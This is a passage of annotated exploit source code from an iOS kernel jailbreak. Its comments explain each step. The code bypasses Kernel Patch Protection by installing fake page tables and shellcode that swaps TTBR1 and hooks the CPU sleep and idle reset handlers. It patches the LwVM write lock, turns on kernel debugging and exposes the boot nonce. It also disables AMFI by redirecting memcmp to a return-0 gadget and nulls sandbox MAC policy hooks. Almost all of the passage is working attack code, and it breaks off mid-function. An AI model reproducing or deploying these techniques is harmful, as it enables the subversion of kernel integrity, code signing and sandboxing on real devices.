    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
    WriteAnywhere64(shc+40, regd); /*handle deepsleep*/
    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
    shc-=0x100;
    {
        // Come back here later when I recognize what it's trying to do with AMFI...
        // ...
        // ...
        // ...
        // Okay what are you up to...
        int n = 0;
        // It's replacing proc->p_csflags with some other value. What does 0x0e00400f mean?
        // 
        // #define CS_VALID                    0x0000001   /* dynamically valid */
        // #define CS_ADHOC                 0x0000002   /* ad hoc signed */
        // #define CS_GET_TASK_ALLOW            0x0000004   /* has get-task-allow entitlement */
        // #define CS_INSTALLER             0x0000008   /* has installer entitlement */
        // #define CS_ENTITLEMENTS_VALIDATED    0x0004000   /* code signature permits restricted entitlements */
        // #define CS_DYLD_PLATFORM         0x2000000   /* dyld used to load this is a platform binary */
        // #define CS_PLATFORM_BINARY           0x4000000   /* this is a platform binary */
        // #define CS_PLATFORM_PATH         0x8000000   /* platform binary by the fact of path (osx only) */
        // 
        // There. It's enabling all the useful Code Signature flags and disable all the detrimental(CS_HARD, CS_KILL, etc) ones.
        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr	w8, 0x28
        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str		w8, [x23]
        // mov x0, 0; to let AMFI know that the validation succeeded.
        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov	 x0, xzr
        // It's just executing what was originally in the "mpo_vnode_check_exec" epilogue.
        WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub	sp, x29, #64
        WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp	x29, x30, [sp, #64]
        WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp	x20, x19, [sp, #48]
        WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp	x22, x21, [sp, #32]
        WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp	x24, x23, [sp, #16]
        WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp	x26, x25, [sp], #80
        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
        
    }
    
    // Give it execute permissions.
    mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
    
    vm_address_t kppsh = 0;
    // This is to allocate space for the hook for "msr  cpacr_el1, x0"
    mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
    {
        int n = 0;
        
        // This "hook" will be called instead of the "msr  cpacr_el1, x0" instruction during the handling of an FPU trap. Further details of the hooking are wayyyy below.
        // x1 = The Fake L1 Page Table
        WriteAnywhere32(kppsh+n, 0x580001e1); n+=4; // ldr	x1, #60
        // x0 = The Real L1 Page Table
        WriteAnywhere32(kppsh+n, 0x58000140); n+=4; // ldr	x0, #40
        // TTBR1_EL1 = The Real L1 Page Table
        WriteAnywhere32(kppsh+n, 0xd5182020); n+=4; // msr	TTBR1_EL1, x0
        // This is what it originally did in "check_user_asts", right before the access to CPACR_EL1.
        WriteAnywhere32(kppsh+n, 0xd2a00600); n+=4; // movz	x0, #0x30, lsl #16
        // Trap to EL3. EL3 will summon KPP and start checking the integrity of RO/RX Kernel Pages & the Page Tables
        WriteAnywhere32(kppsh+n, 0xd5181040); n+=4; // msr	CPACR_EL1, x0
        // After EL3 is done with it's job, execution continues here
        // TTBR1_EL1 = The Fake L1 Page Table
        // The Page for kppsh code is still accessible because it's probably still in the TLB, or even if it's not, it doesn't get affected by the L1 Page Table replacement because it's somewhere
        // in the L3 Page Table, which both the Fake & Real L1 Page Table can access
        WriteAnywhere32(kppsh+n, 0xd5182021); n+=4; // msr	TTBR1_EL1, x1
        // Not entirely sure why it's doing this. I think it's left over code
        WriteAnywhere32(kppsh+n, 0x10ffffe0); n+=4; // adr	x0, #-4
        // KPP might have swept the address that contains our patch to "msr  cpacr_el1, x0". In that case, the TLB holds the address of the real page that is not patched, and if kernel executes that
        // address, then the real unpatched "msr  cpacr_el1, x0" will be executed. Therefore, we must flush the TLB so that the execution will happen on our fake page with the patch, not the real one.
        // Synchronization Barrier for TLB flush
        WriteAnywhere32(kppsh+n, isvad ? 0xd5033b9f : 0xd503201f); n+=4; // dsb ish (4k) / nop (16k)
        // Flush the TLB. Either flush the entire TLB(Page size : 4K) or flush the specific page(16K) that contains the address in x30
        // Now the trampoline patch on "msr  cpacr_el1, x0" has been resurrected.
        WriteAnywhere32(kppsh+n, isvad ? 0xd508871f : 0xd508873e); n+=4; // tlbi vmalle1 (4k) / tlbi	vae1, x30 (16k)
        // Barrier lifted and the flushed TLB is applied
        WriteAnywhere32(kppsh+n, 0xd5033fdf); n+=4; // isb
        // Return back to the instruction right after the hook
        WriteAnywhere32(kppsh+n, 0xd65f03c0); n+=4; // ret
        // The address of the Real L1 Page Table
        WriteAnywhere64(kppsh+n, ReadAnywhere64(ttbr0_real)); n+=8;
        // The address of the Fake L1 Page Table
        WriteAnywhere64(kppsh+n, physp); n+=8;
        // Sorta redundant
        WriteAnywhere64(kppsh+n, physp); n+=8;
    }
    
    // Give it executable permissions
    mach_vm_protect(tfp0, kppsh, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
    
    // Remember the small trampolines for idle/deep sleep?
    /*
        ldr x30, 0x00000010
        ldr x0, 0x00000018
        br  x0
        0x10:
        ???
        0x18:
        [resume_idle_cpu]   <- will be stored later in the while loop
    */
    // Now finally, it's setting that unknown ??? value that eventually goes into x30. Why is it setting x30? This becomes clear when you look at how the two functions are implemented.
    // The function flow goes like this : resume_idle_cpu->start_cpu->common_start->........// If x21 != 0, we're doing a warm reset, so we need to trampoline to the kernel pmap.; cbnz x21, Ltrampoline ->arm_init_tramp
    // And finally, it's RETing using the value in x30. Aha! So it's trying trying to change the return address after the warm reset finishes. Eventually, "arm_init_tramp" will RET to our shellcode(shc) above.
    // But where does it initially try to return to?
    /*
        LEXT(resume_idle_cpu)
        adrp    lr, EXT(arm_init_idle_cpu)@page
        add     lr, lr, EXT(arm_init_idle_cpu)@pageoff
        b       start_cpu
    */
    // It initially tried to return to "arm_init_idle_cpu", which wakes up the CPU from idle. But wait... the "arm_init_idle_cpu" address is stored directly into lr(x30)!! So setting x30 to a different
    // address would be rendered useless, unless we start executing from the middle of "resume_idle_cpu".
    WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
    // This one's setting up the resume address for deep sleep, "start_cpu". The deep sleep handler will RET to (shc + 0x100).
    WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle
    
    // These two lines solve the problem mentioned just a couple lines above. It makes x0 load "resume_idle_cpu + 8", which jumps over the code where "arm_init_idle_cpu" is loaded in x30.
    // Now all that's left is to replace the original sleep handler address so it would jump to these fake 12 byte trampolines instead of jumping to the original "resume_idle_cpu".
    // The small trampoline code above can be refined to :
    /*
        ldr x30, 0x00000010
        ldr x0, 0x00000018
        br  x0
        0x10:
        ???
        0x18:
        [resume_idle_cpu + 8]   <- This jumps over the X30 setting code of "resume_idle_cpu"
    */
    WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
    // Same for deep sleep
    WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler
    
    /*
     
     pagetables are now not real anymore, they're real af
     
     */
    
    // Find the address of "msr  cpacr_el1, x0"
    uint64_t cpacr_addr = find_cpacr_write();
// Page size
#define PSZ (isvad ? 0x1000 : 0x4000)
// Page mask
#define PMK (PSZ-1)
    
    
#define RemapPage_(address) \
pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
    // Read the original Translation Table Entry
    uint64_t tte = ReadAnywhere64(tte_addr);\
    // Is it a Block(not a Page)?
    if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
        // I've looked at this code multiple times and I'm still confused about a small aspect of the code.
        // To me, it seems this logic doesn't take into account if the Page Size is 4KB granule, and there is a block in the L1 Page Table.
        // If that's the case, then it should break up the 1GB into 2MB blocks, and save all of them into the fake L2 Page Table and mark them all as Blocks.
        // Then the next recursive run will break all those 512 Page Table Entries into Pages, which is a huge overkill but still necessary if you want to handle everything in Pages.
        // I guess iOS doesn't support Blocks in the L1 Page Table, or it actually does, but there are no regions big enough(1GB) to be placed in the L1 Page Table as a Block.
        NSLog(@"breakup!");\
        // Create a new fake page table
        uint64_t fakep = physalloc(PSZ);\
        // Get the address of the Block from the Page Table Entry
        uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
        // Mark it as a Table, instead of a Block
        TTE_SETB(tte, TTE_IS_TABLE_MASK);\
        // Break the whole Block into Pages, and store each entry into the Fake Page Table
        for (int i = 0; i < PSZ/8; i++) {\
            // Calculate the TTE value and save it
            TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
            WriteAnywhere64(fakep+i*8, tte);\
        }\
        // Replace the Block Entry with a fake Page Table Entry that contains every single page in the Block
        TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
        WriteAnywhere64(tte_addr, tte);\
    }\
    // Allocate a fake Translation Ta........... Fuck it. Typing T.r.a.n.s.l.a.t.i.o.n. is so annoying. I'm gonna call it Page Table from now on because 'Page Table' sounds better.
    uint64_t newt = physalloc(PSZ);\
    // Copy the entire Page Table into the new space. This fake Page Table will eventually take place of the old one. The size of Page Tables are the size of the architecture's Page, according to the ARMv8 manual.
    copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
    // We need to keep everything in the kernel so the kernel sees these fake tables in any occasion
    copyout(newt, bbuf, PSZ);\
    // Set the new "Output Address" that points to the fake Page Table
    TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
    // Clear the NX bit
    TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
    // Clear the PXN bit
    TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
    // One thing that still confuses me is that the above code logic didn't really bother to set the AP bits of the TTE to read/write(00 or 01).
    // Does that mean that the kernel code was already R/W to begin with...? Or maybe "mach_vm_write" doesn't give a crap about the access permissions. I don't know for sure.(And even after going through the entire exploit, I'm still not sure. I guess it *JUST WORKS*)
    // Since the original flags of the TTE is still intact, the copied code will also be executable
    // Now overwrite the original TTE
    WriteAnywhere64(tte_addr, tte);\
// level1_table is later going to point to our fakely setup L1 Page Table
}, level1_table, isvad ? 1 : 2);
    
// Walk the Fake Page Table starting from L1, in order to get the VA of the newly mapped Fake Page that has exactly the same contents as the original page.
#define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)
    
    // An array to keep track of pages that have already been remapped
    uint64_t* remappage = calloc(512, 8);
    
    int remapcnt = 0;
    
// Walk the Page Tables and remap all Page Table Entries corresponding to the supplied VA to fake Page Table Entries. During the process, it'll wipe 
#define RemapPage(x)\
{\
int fail = 0;\
// Is the page already in the list of remapped pages?
for (int i = 0; i < remapcnt; i++) {\
if (remappage[i] == (x & (~PMK))) {\
fail = 1;\
}\
}\
// Don't remap again
if (fail == 0) {\
// Remap the page
RemapPage_(x);\
// Remap the following page, just in case the patch target spans 2 pages
RemapPage_(x+PSZ);\
// Save it to the array so it doesn't get remapped twice
remappage[remapcnt++] = (x & (~PMK));\
}\
}
    
    // Convert the PA of the fake L1 Translation Table back to VA. I find it weird why you would have to use findphys_real() for the inverse, instead of just +gVirtBase-gPhysBase.
    level1_table = physp - gPhysBase + gVirtBase;
    // Overwriting "kernel_pmap->tte" with the address of the fake L1 Tranlation Table. Now things are finally getting interesting. The pristine kernel just got contaminated.
    // Now everytime the kernel accesses any VA, the MMU will walk our L1 Fake Page Table. However, KPP is watching the Page Tables... albeit, very slowly. Let's pray that KPP doesn't kick in before we
    // setup the KPP neutralizing pathces.
    WriteAnywhere64(ReadAnywhere64(pmap_store), level1_table);
    
    // There is some slack space after the segment load commands because sections need to be page aligned. Use that slack space to store a small 
    uint64_t shtramp = kernbase + ((const struct mach_header *)find_mh())->sizeofcmds + sizeof(struct mach_header_64);
    // Remap the page(Create a fake page) that contains the "msr  cpacr_el1, x0" instruction, to RWX.
    RemapPage(cpacr_addr);
    // Calculate the distance from the current instruction until the slack space. Then embed it into the "bl" instruction. This effectively branches to the trampoline that is about the be written into the slack space.
    // Remember, KPP is continously activated via the FPU(Tick) and the IRQ(Tock). When an FPU instruction is executed, the Exception Handler catches it and goes through
    // "Any one of the FPU Exception Handlers->exception_return_dispatch->check_user_asts->........; msr  cpacr_el1, x0; ........."
    // This part patches out the instruction(msr  cpacr_el1, x0) that traps into EL3. It branches to a small trampoline that's constructed below.
    WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));
    
    RemapPage(shtramp);
    // ldr x1, 8
    WriteAnywhere32(NewPointer(shtramp), 0x58000041);
    // br x1
    WriteAnywhere32(NewPointer(shtramp)+4, 0xd61f0020);
    // This effectively branches to "kppsh"
    // This means the "msr  cpacr_el1, x0" will actually be replaced to a call into "kppsh".
    WriteAnywhere64(NewPointer(shtramp)+8, kppsh);
    
    // Gets the address of data that contains the function pointer "PE_i_can_has_kernel_configuration"
    uint64_t lwvm_write = find_lwvm_mapio_patch();
    // Gets the address of the epilogue of "LightWeightVolumeManager::_mapForIO()"
    uint64_t lwvm_value = find_lwvm_mapio_newj();
    // Since the region where the function ponter is stored is Read Only, remap it
    RemapPage(lwvm_write);
    // Now overwrite that function pointer with the Epilogue of "LightWeightVolumeManager::_mapForIO()".
    // By applying this patch, somewhere in the middle of the check for write lock, the function will just return immediately from _mapForIO.
    // This is because during the check, it calls into "PE_i_can_has_kernel_configuration" by using a function pointer stored in the const section, but because the pointer has been overwritten
    // to the epilogue of "LightWeightVolumeManager::_mapForIO()", the rest of the checks are simply skipped
    WriteAnywhere64(NewPointer(lwvm_write), lwvm_value);
    
    // These are displayed in the console when you type 'uname'
    uint64_t kernvers = find_str("Darwin Kernel Version");
    uint64_t release = find_str("RELEASE_ARM");
    
    // Right before the "Darwin Kernel Version" is the "debug_enabled" global variable. This needs be set to 1 in order to let host_info(used by zprint) work correctly,
    // and also has the benefit of making PE_i_can_has_debugger always return True.
    RemapPage(kernvers-4);
    WriteAnywhere32(NewPointer(kernvers-4), 1);
    
    // Changing a part of the uname to something cool
    RemapPage(release);
    // Maybe sometimes the string is sitting on the boundary of a Page...?
    if (NewPointer(release) == (NewPointer(release+11) - 11)) {
        copyout(NewPointer(release), "MarijuanARM", 11); /* marijuanarm */
    }
    
    
    /*
     nonceenabler
     */
    
    {
        // Getting the nonce entry from the NVRAM array
        uint64_t sysbootnonce = find_sysbootnonce();
        NSLog(@"%x", ReadAnywhere32(sysbootnonce));
        
        // According to "IONVRAM.cpp", this is what an NVRAM array entry looks like
        /*
        struct OFVariable {
          const char *variableName;
          UInt32     variableType;
          UInt32     variablePerm;
          SInt32     variableOffset;
        };
        */
        // So according to the above function, it's returning the address of "current_OFVariable->variablePerm".
        // And according to "IONVRAM.h" :
        /*
        enum {
          kOFVariablePermRootOnly = 0,
          kOFVariablePermUserRead,
          kOFVariablePermUserWrite,
          kOFVariablePermKernelOnly
        };
        */
        // It's trying to change "kOFVariablePermKernelOnly" -> "kOFVariablePermUserRead" so the "com.apple.System.boot-nonce" NVRAM variable can be read from userland
        WriteAnywhere32(sysbootnonce, 1);
    }
    
    
    // Search for the GOT entry of memcmp, used by AMFI
    uint64_t memcmp_got = find_amfi_memcmpstub();
    // Find a "return 0;" gadget
    uint64_t ret1 = find_ret_0();
    
    // Remap the GOT
    RemapPage(memcmp_got);
    // It makes every single memcmp operation return "Binary Data is the same". I guess this universally disables all annoying checks in AMFI that involves data comparison,
    // and luckily doesn't really break the functionality of AMFI
    WriteAnywhere64(NewPointer(memcmp_got), ret1);
    
    // idlesleep_handler+0xC = &resume_idle_cpu + 0xC = &start_cpu
    // Getting an address within "cpu_machine_idle_init"
    uint64_t fref = find_reference(idlesleep_handler+0xC, 1, SearchInCore);
    NSLog(@"fref at %llx", fref);
    
    // Find AMFI's MAC hooks structure
    uint64_t amfiops = find_amfiops();
    
    NSLog(@"amfistr at %llx", amfiops);
    
    
    {
        /*
         amfi
         */
        
        // Calculate the end of the structure. Perhaps this structure definition has to change slightly in different versions...?
        uint64_t sbops = amfiops;
        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
        
        uint64_t nopag = sbops_end - sbops;
        
        // Remap all the pages that contain the struct, which is currently in the __const section.
        for (int i = 0; i < nopag; i+= PSZ) {
            RemapPage(((sbops + i) & (~PMK)));
        }
        // Wipe out a single MAC hook, mpo_file_check_mmap. This enables mmaping RWX pages from now on.
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
    }
    
    // "fref" holds an address within "cpu_machine_idle_init"
    /*
     first str
     */
    while (1) {
        uint32_t opcode = ReadAnywhere32(fref);
        // Searching until it finds the "STR" opcode
        if ((opcode & 0xFFC00000) == 0xF9000000) {
            // Calculating the destination address of the "STR"
            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
            int32_t myreg = (opcode >> 5) & 0x1f;
            // The result of the address of a global variable, "unsigned int   start_cpu_paddr;"
            // Now in order to understand what's going on, we need to understand what happends when a device wakes up from idle state.
            // The address where the device will start executing will be set within the "targetCPU->quiesceCPU()" function, which is in the ApplePMGR IOKit(I'm not really sure about this though, haven't reversed it),
            // which is set to "LowResetVectorBase". Let's look at what "LowResetVectorBase" is doing...
            /*
                ...
                ...
                ...
                adrp    x19, EXT(ResetHandlerData)@page         // Get address of the reset handler data
                add     x19, x19, EXT(ResetHandlerData)@pageoff
                mrs     x15, MPIDR_EL1                      // Load MPIDR to get CPU number
                and     x0, x15, #0xFF                      // CPU number is in MPIDR Affinity Level 0
                ldr     x1, [x19, CPU_DATA_ENTRIES]         // Load start of data entries
                add     x3, x1, MAX_CPUS * 16               // end addr of data entries = start + (16 * MAX_CPUS)  
            Lcheck_cpu_data_entry:
                ldr     x21, [x1, CPU_DATA_PADDR]           // Load physical CPU data address
                cbz     x21, Lnext_cpu_data_entry
                ldr     w2, [x21, CPU_PHYS_ID]              // Load ccc cpu phys id
                cmp     x0, x2                      // Compare cpu data phys cpu and MPIDR_EL1 phys cpu
                b.eq        Lfound_cpu_data_entry               // Branch if match
            Lnext_cpu_data_entry:
                add     x1, x1, #16                 // Increment to the next cpu data entry
                cmp     x1, x3
                b.eq        Lskip_cpu_reset_handler             // Not found
                b       Lcheck_cpu_data_entry   // loop
            Lfound_cpu_data_entry:
                adrp        x20, EXT(const_boot_args)@page
                add     x20, x20, EXT(const_boot_args)@pageoff
                ldr     x0, [x21, CPU_RESET_HANDLER]        // Call CPU reset handler
                cbz     x0, Lskip_cpu_reset_handler

                // Validate that our handler is one of the two expected handlers
                adrp    x2, EXT(resume_idle_cpu)@page
                add     x2, x2, EXT(resume_idle_cpu)@pageoff
                cmp     x0, x2
                beq     1f
                adrp    x2, EXT(start_cpu)@page
                add     x2, x2, EXT(start_cpu)@pageoff
                cmp     x0, x2
                bne Lskip_cpu_reset_handler
                blr     x0
            */
            // Well actually, the two function pointer checks have been added later to mitigate global function pointer hooking(along with a lot of other code sprinkled here and there that makes this technique unusable).
            // Which one(resume_idle_cpu, start_cpu) is going to be stored in "CPU_RESET_HANDLER"? We need to first see where that variable(cpu_data->cpu_reset_handler) is being set. It's being set here :
            /*
                void cpu_machine_idle_init(boolean_t from_boot) {
                    ...
                    ...
                    ...
                    cpu_data_ptr->cpu_reset_handler = resume_idle_cpu_paddr;
                    ...
                    ...
            */
            // One thing to note is that currently, "resume_idle_cpu_paddr" is now a local variable, and it gets set to the hardcoded address of "resume_idle_cpu". Back when it was vulnerable to the KPP bypass,
            // it used to be a global variable like "unsigned int   start_cpu_paddr;". I guess the apple developers changed it to thwart the global variable hooking technique.
            // The other part where it's being set is here :
            /*
                kern_return_t cpu_start(int cpu) {
                    ...
                    ...
                    ...
                    cpu_data_ptr->cpu_reset_handler = (vm_offset_t) start_cpu_paddr;
                    ...
                    ...
            */
            // and here :
            /*
                void cpu_sleep(void) {
                    ...
                    ...
                    ...
                    cpu_data_ptr->cpu_reset_handler = (uintptr_t) start_cpu_paddr;
                    ...
                    ...
            */
            // The only relevant one is the second one because the first one is executed by the first-to-wakeup CPU, so we should see what happens before all the CPUs go to sleep.
            // When the CPUs go to sleep, each and every CPU handler is being set to "start_cpu_paddr". So what the heck is "start_cpu_paddr"?
            /*
            void cpu_machine_idle_init(boolean_t from_boot) {
                ...
                ...
                if (from_boot) {
                    ...
                    ...
                    start_cpu_paddr = ml_static_vtop((vm_offset_t)&start_cpu);
                    resume_idle_cpu_paddr = ml_static_vtop((vm_offset_t)&resume_idle_cpu);
                    ...
                    ...
            */
            // So that global variable is set once during the bootup. Also, note that "resume_idle_cpu_paddr" is also being set(which was a global var back in the times).
            // Now we can get a vague idea of what happens when the device goes from sleep -> wakeup :
            // _LowResetVectorBase(reads "cpu_data_ptr->cpu_reset_handler", then jumps there) -> _start_cpu -> start_cpu -> common_start -> Ltrampoline -> arm_init_tramp -> RET : arm_init_cpu(which was set to LR from "_start_cpu").
            // Finally we can understand what this piece of code is trying to do. Since cpu_sleep() gets executed when the device goes into sleep, and "cpu_data_ptr->cpu_reset_handler" gets set to whatever was
            // stored in "start_cpu_paddr"(which gets set only *once* during device bootup), if we change "start_cpu_paddr" into some other value, we can make the the above chain of calls transform into :
            // _LowResetVectorBase -> AN_ADDRESS_OF_OUR_CHOOSING
            // But what is it setting it to...?
            uint64_t rgz = find_register_value(fref, myreg)+outhere;
            
            // From the code wayyyy above, physcode+0x200 is filled with the assembly below.
            /*
                ldr x30, 0x00000010
                ldr x0, 0x00000018
                br  x0
                0x10:
                shc+0x100
                0x18:
                [start_cpu + 8] <- This jumps over the setting of X30 from "start_cpu"
            */
            // Now we can refine the control flow as following :
            // _LowResetVectorBase(reads "cpu_data_ptr->cpu_reset_handler", then jumps there) -> Our small trampoline(shellcode+0x200) -> ...
            // _LowResetVectorBase -> shellcode+0x200(which sets LR to shc+0x100) -> start_cpu -> common_start -> Ltrampoline -> arm_init_tramp -> RET(shc+0x100)
            // Now we need to go back up and see what it's trying to do in "shc+0x100".
            //
            // Everything is kind of hodgepodge inside my head. Let's reiterate to clarify what is happening.
            // When the CPU goes to sleep, "cpu_sleep" will be called and set "cpu_data_ptr->cpu_reset_handler" to the value stored in the global variable "start_cpu_paddr". But our current looping code has
            // Found that address by searching for a "STR", and overwritten that with "physcode+0x200". This means that when the device wakes up, it'll start executing from "_LowResetVectorBase" and read
            // "cpu_data_ptr->cpu_reset_handler", which is "physcode+0x200", and jump there. "physcode+0x200" is a minitrampoline and sets LR into "shc+0x100", and jumps to "start_cpu+8". "start_cpu+8" will
            // immediately jump to "start_cpu+8", and the code will flow all the way to "arm_init_tramp". "arm_init_tramp" will attempt to restore TTBR1_EL1, but "RET" will return to "shc+0x100" which
            // loads TTBR1_EL1 again with our fake L1 Page Table and flushes the TLB, and finally jumps to the place where "arm_init_tramp" was trying to RET to, "arm_init_cpu".
            // 
            // Phew! Now the fake TTBR1 technique is finally understood. It's doing the switcharoo when EL3 kicks in from "msr  cpacr_el1, x0", and hooking the sleep handlers so "arm_init_tramp" doesn't
            // mess up TTBR1_EL1.
            WriteAnywhere64(rgz, physcode+0x200);
            break;
        }
        // Just looping until it finds a "STR"
        fref += 4;
    }
    
    fref += 4;
    
    // Doing the same thing with the IDLE handler. If you look at the assembly code from "cpu_machine_idle_init", the setting of the global variable "resume_idle_cpu_paddr" happens right after the setting
    // of the global var "start_cpu_paddr", as can also be seen in the source code :
    /*
            void cpu_machine_idle_init(boolean_t from_boot) {
                ...
                ...
                if (from_boot) {
                    ...
                    ...
                    start_cpu_paddr = ml_static_vtop((vm_offset_t)&start_cpu);
                    resume_idle_cpu_paddr = ml_static_vtop((vm_offset_t)&resume_idle_cpu);
                    ...
                    ...
            */
    /*
    // Note : "resume_idle_cpu_paddr" used to be a global variable, but in later iOS versions(11.x), it seems to have been switched to a local var in order to deter the global var hooking technique.
    // Strangely, "start_cpu_paddr" still remains as a global variable, but KTTR is now hardware based so I guess it doesn't really matter.
     second str
     */
    while (1) {
        uint32_t opcode = ReadAnywhere32(fref);
        if ((opcode & 0xFFC00000) == 0xF9000000) {
            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
            int32_t myreg = (opcode >> 5) & 0x1f;
            uint64_t rgz = find_register_value(fref, myreg)+outhere;
            
            WriteAnywhere64(rgz, physcode+0x100);
            break;
        }
        fref += 4;
    }
    
    // The current source code doesn't want to nuke the entire Sandbox policies. Let's assume that it does and see what it's trying to do.
    if (nukesb) {
        /*
         sandbox
         */
        
        // defined in "xnu/security/mac_policy.h.auto.html", "mac_policy_ops" contains every single MAC hook to be used for the MAC policy, and you can set specific hooks that you're interested in and
        // pass it along to mac_policy_register() to make it applied systemwide. the SandBox KEXT sets quite a few operations, and the below code tries to wipe out all those hooks out to NULL so the hooks
        // won't be invoked at all. But first, let's find the "mac_policy_ops" that's used by the SandBox.
        uint64_t sbops = find_sbops();
        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;
        
        // It's sort of rounding it up to the Page size to be used in the loop iteration count below.
        uint64_t nopag = (sbops_end - sbops)/(PSZ);
        
        // Remap all these pages to R/W
        for (int i = 0; i < nopag; i++) {
            RemapPage(((sbops + i*(PSZ)) & (~PMK)));
        }
        
        // Wiping every single SandBox MAC hook to NULL. Good old times I guess...
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
        
    }
    
    // We don't nuke the entire MAC policy ops table, but just hook the most critical one : mpo_vnode_check_exec(When a binary is executed)
    {
        // Find the AMFI MAC hook for mpo_vnode_check_exec
        // Subtract 0x18 to get the address of the beginning of the Epilogue(SUB      SP, X29, 0x40).
        uint64_t point = find_amfiret()-0x18;
        
        // Remapping as R/W
